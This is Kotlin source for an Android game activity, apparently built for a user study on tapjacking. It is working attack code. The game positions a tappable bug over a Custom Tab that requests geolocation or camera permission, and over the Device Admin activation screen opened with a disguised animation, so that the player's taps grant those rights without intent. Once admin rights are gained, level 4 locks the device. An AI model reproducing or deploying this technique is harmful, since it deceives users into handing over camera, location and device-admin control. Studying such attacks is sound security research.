package com.taptrap.userstudy.killthebugs

import android.animation.AnimatorSet
import android.animation.ObjectAnimator
import android.app.ActivityOptions
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.ImageButton
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.RelativeLayout
import android.widget.TextView
import androidx.activity.ComponentActivity
import androidx.core.animation.addListener
import kotlin.random.Random
import java.util.Locale


/**
 * Activity that represents a level in the game.
 */
class LevelActivity : ComponentActivity(), ClickListener {

    private var handler = Handler(Looper.getMainLooper())  // Create a handler

    private var exploitationFailedHandler = Handler(Looper.getMainLooper())  // Create a handler

    private lateinit var customTabHelper: CustomTabHelper
    private lateinit var permissionAPIUrl: String

    private lateinit var bugButton: ImageButton // The bug button
    private lateinit var killImage: ImageView // The bug button
    private lateinit var pointsText: TextView // The points text
    private lateinit var levelText: TextView // The level text

    private lateinit var debugText: TextView // Debug text permission granted
    private lateinit var dpm: DevicePolicyManager

    private var exploitOngoing = false;
    private var nextRoundDelay: Long = 1800;
    private var points = 0;
    private var level = 1;

    private var adminMode = false;

    private var levelUpThreshold = 4;
    private var exploitPoints = 3;

    private val flowers = ArrayList<Pair<Float, Float>>()

    private val runnable = object : Runnable {
        override fun run() {
            addFlower(null)
            handler.postDelayed(this, 333)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.game)

        customTabHelper = CustomTabHelper(this, this)
        permissionAPIUrl = this.getString(R.string.webapp)

        dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

        // Set references to UI elements
        pointsText = findViewById(R.id.pointsText)
        levelText = findViewById(R.id.levelText)
        bugButton = findViewById(R.id.bugButton)
        killImage = findViewById(R.id.killImage)
        debugText = findViewById(R.id.debugText)

        // Set level Counter
        level = intent.getIntExtra("level", 1)
        adminMode = intent.getBooleanExtra("adminMode", false)
        levelText.text = "Stufe $level"
        levelText.visibility = View.VISIBLE

        val thisView = findViewById<View>(R.id.gameview)
        var c = 0
        when (level){
            1 -> c = resources.getColor(R.color.level1_background)
            2 -> c = resources.getColor(R.color.level2_background)
            3 -> c = resources.getColor(R.color.level3_background)
            4 -> {
                c = resources.getColor(R.color.black)
                handler.removeCallbacksAndMessages(null);
                Log.d("STATUS", "Gutes Spiel!")
                adminAction()
            }
        }
        thisView.setBackgroundColor(c)
        levelText.setBackgroundColor(c)
        pointsText.setBackgroundColor(c)
    }

    override fun onResume() {
        super.onResume()

        // Set point Counter
        points = intent.getIntExtra("points", 0)
        pointsText.text = "$points Punkte"
        pointsText.visibility = View.VISIBLE

        val flowers = intent.getSerializableExtra("flowers") as? ArrayList<Pair<Float, Float>>
        if (flowers != null) {
            for (p in flowers) {
                addFlower(p)
            }
        }

        // Run handler for flowers
        handler.post(runnable)

        // Register Click Handler
        bugButton.setOnClickListener {
            points ++
            pointsText.text = "$points Punkte"

            if (points >= levelUpThreshold) {
                nextLevel()
            } else {
                clicked(false)
            }
        }
        drawBugForNextRound()
    }

    /**
     * Adds the flowers to the screen.
     */
    private fun addFlower(p: Pair<Float, Float>?) {
        val imageView = ImageView(this)

        if (Random.nextBoolean()) {
            imageView.setImageDrawable(resources.getDrawable(R.drawable.flower_svgrepo_com_1))
        } else {
            imageView.setImageDrawable(resources.getDrawable(R.drawable.flower_svgrepo_com_white))
        }

        if (p == null) {
            val offset = 50
            val screenWidth = resources.displayMetrics.widthPixels
            val screenHeight = resources.displayMetrics.heightPixels
            val randomX = Random.nextInt(offset, screenWidth - 2 * offset)
            val randomY = Random.nextInt(offset, screenHeight - 2 * offset)
            imageView.x = randomX.toFloat()
            imageView.y = randomY.toFloat()
        } else {
            imageView.x = p.first
            imageView.y = p.second
        }
        val layoutParams = LinearLayout.LayoutParams(64, 64)
        imageView.layoutParams = layoutParams
        imageView.z = -1000f

        val layout = findViewById<RelativeLayout>(R.id.gameview)
        layout.addView(imageView)

        val pFlower = Pair(imageView.x, imageView.y)
        flowers.add(pFlower)

        handler.postDelayed({
            layout.removeView(imageView)
            flowers.remove(pFlower)
        }, 1600)
    }

    /**
     * Called when the bug button is clicked.
     */
    override fun clicked(fromCT: Boolean) {
        if (fromCT && !exploitOngoing) {
            // No exploitation is currently ongoing, so we don't want to do anything
            return
        }


        //bugButton.visibility = View.GONE
        killImage.visibility = View.INVISIBLE
        bugButton.isEnabled = false

        val scaleXDown = ObjectAnimator.ofFloat(bugButton, "scaleX", 1f, 0f)
        scaleXDown.duration = nextRoundDelay - 50
        val scaleYDown = ObjectAnimator.ofFloat(bugButton, "scaleY", 1f, 0f)
        scaleYDown.duration = nextRoundDelay - 50

        // Combine the animations into a sequential animation set
        val animatorSet = AnimatorSet()
        animatorSet.playSequentially(
            AnimatorSet().apply { playTogether(scaleXDown, scaleYDown) }
        )
        animatorSet.start()
        // wait for the animation to finish before going to the next round
        animatorSet.addListener {
            bugButton.visibility = View.GONE
        }


        if (points == exploitPoints) {
            if (exploitOngoing) {
                exploitOngoing = false
                exploitationFailedHandler.removeCallbacksAndMessages(null);
            } else {
                when (level) {
                    1 -> {
                        debug("Triggering geolocation Custom Tab")
                        exploitCustomTab("geolocation")
                    }
                    2 -> {
                        debug("Triggering camera Custom Tab")
                        exploitCustomTab("camera")
                    }
                    3 -> {
                        debug("Triggering Device Admin screen")
                        exploitDeviceManager()
                    }
                    else -> {
                        debug("No exploit action for level=$level")
                    }                }
                exploitOngoing = true
                if (!adminMode) {
                    startExploitationFailedHandler()
                }
            }
        }

        handler.postDelayed({
            drawBugForNextRound()
        }, nextRoundDelay);
    }

    /**
     * In case the exploitation fails, i.e., the website takes too long to load, we don't want to show the website anymore.
     * If it takes more than 5 seconds, we simply go to the next round.
     */
    private fun startExploitationFailedHandler() {
        Log.i("EXPLOIT", "Starting Exploitation Failed Handler")
        exploitationFailedHandler.postDelayed({
            clicked(false)
            Log.e("EXPLOIT", "Exploitation failed")
        }, 4000)

    }

    /**
     * Animates the bug button.
     */
    private fun animateBtn() {
        val scaleX = ObjectAnimator.ofFloat(bugButton, "scaleX", 0f, 1f)
        val scaleY = ObjectAnimator.ofFloat(bugButton, "scaleY", 0f, 1f)
        val animatorSet = android.animation.AnimatorSet()
        animatorSet.playTogether(scaleX, scaleY)
        animatorSet.duration = 400  // 1 second
        animatorSet.interpolator = AccelerateDecelerateInterpolator()
        animatorSet.start()
    }

    /**
     * Draws the bugs.
     */
    private fun drawBugForNextRound() {
        val language = Locale.getDefault().language

        if (points == exploitPoints) {
            if (exploitOngoing) {
                val exploitPosition = when (level) {
                    1 -> Pair(800f, 1250f) // geolocation
                    2 -> Pair(800f, 1250f) // camera
                    3 -> {
                        when (language) {
                            "en" -> {
                                Pair(600f, 700f)
                            }
                            "de" -> {
                                Pair(800f, 700f)
                            }
                            else -> {
                                // Adjust bug position for different language
                                Pair(600f, 700f)
                            }
                        }

                    } // device admin, tune this separately
                    else -> Pair(750f, 1300f)
                }

                // Before exploit
                bugButton.x = exploitPosition.first
                bugButton.y = exploitPosition.second
                killImage.x = exploitPosition.first
                killImage.y = exploitPosition.second

                bugButton.visibility = View.VISIBLE
                bugButton.isEnabled = true
                animateBtn()
                killImage.visibility = View.GONE
            } else {
                // After exploit
                bugButton.visibility = View.GONE
                killImage.visibility = View.GONE
                Log.i("EXPLOIT", "Opening activity")
                restart()
            }
        } else {
            // Get the dimensions of the screen
            val screenWidth = resources.displayMetrics.widthPixels
            val screenHeight = resources.displayMetrics.heightPixels

            // Calculate random x and y coordinates within screen bounds
            val offset = 50
            val randomX = Random.nextInt(offset, screenWidth - 2 * bugButton.width -  3 * offset)
            val randomY = Random.nextInt((screenHeight * 0.33).toInt(), screenHeight - bugButton.height)

            Log.d("COORDS", "Button coordinates: ($randomX, $randomY)")

            // Update the button's position
            bugButton.x = randomX.toFloat()
            bugButton.y = randomY.toFloat()

            killImage.x = randomX.toFloat()
            killImage.y = randomY.toFloat()

            bugButton.visibility = View.VISIBLE
            bugButton.isEnabled = true
            animateBtn()
            killImage.visibility = View.GONE
        }
    }

    /**
     * Restarts the current activity and adds a point.
     */
    private fun restart() {
        Log.d("STATUS", "Restart")
        val self = Intent(this, LevelActivity::class.java)
        self.addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION or Intent.FLAG_ACTIVITY_SINGLE_TOP)

        val flowerTuples: ArrayList<Pair<Float, Float>> = ArrayList<Pair<Float, Float>>()
        for (flower in flowers) {
            flowerTuples.add(flower)
        }

        self.putExtra("flowers", flowerTuples)
        self.putExtra("points", points + 1)
        self.putExtra("level", level)
        self.putExtra("adminMode", adminMode)
        startActivity(self)
    }

    /**
     * Proceeds to the next level.
     */
    private fun nextLevel() {
        Log.d("STATUS", "NextLevel")
        val self = Intent(this, MainActivity::class.java)
        val options = ActivityOptions.makeCustomAnimation(this, R.anim.regular_fade_in, R.anim.regular_fade_out)
        self.putExtra("points",0)
        self.putExtra("level", level + 1)
        self.putExtra("adminMode", adminMode)
        startActivity(self, options.toBundle())
    }

    /**
     * Starts the Custom Tab
     * @param permissionName The name of the permission to exploit.
     */
    private fun exploitCustomTab(permissionName: String) {
        Log.d("EXPLOIT", "Custom Tab exploit!!")
        val rawURL = "$permissionAPIUrl?access=$permissionName"
        var mode = permissionName
        if (adminMode) {
            mode += "_admin"
        }
        debug("CustomTab mode=$mode adminMode=$adminMode")
        customTabHelper.openCustomTab(rawURL, mode)
    }

    /**
     * Starts the device manager settings screen.
     */
    private fun exploitDeviceManager() {
        Log.d("EXPLOIT", "Device Manager exploit!!")

        val i = Intent().setComponent(
            ComponentName(
                "com.android.settings",
                "com.android.settings.applications.specialaccess.deviceadmin.DeviceAdminAdd"
            )
        )

        i.setAction("android.app.action.ADD_DEVICE_ADMIN")
        i.addCategory("android.intent.category.DEFAULT")
        i.putExtra(
            DevicePolicyManager.EXTRA_DEVICE_ADMIN,
            ComponentName(applicationContext.packageName,
            "com.taptrap.userstudy.killthebugs.MyDeviceAdminReceiver")
        )
        val fadeIn: Int;
        if (adminMode) {
            fadeIn = R.anim.fade_in_dmp_admin
        } else {
            fadeIn = R.anim.fade_in_dmp
        }
        // val opt = ActivityOptions.makeCustomAnimation(this, fadeIn, R.anim.fade_out)
        val opt = ActivityOptions.makeCustomAnimation(this, fadeIn, R.anim.no_exit)
        startActivity(i, opt.toBundle())
    }

    /**
     * Locks the device immediately.
     */
    private fun adminAction() {
        try {
            dpm.lockNow()
        } catch (ex: SecurityException) {
            Log.d("LOCK", ex.toString())
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Unbind the Custom Tabs Service when the activity is destroyed
        customTabHelper.unbindService()
        handler.removeCallbacksAndMessages(null);
    }

    // print permission
    private fun debug(message: String) {
        Log.d("PERMISSION_DEBUG", message)
        debugText.text = message
    }
}
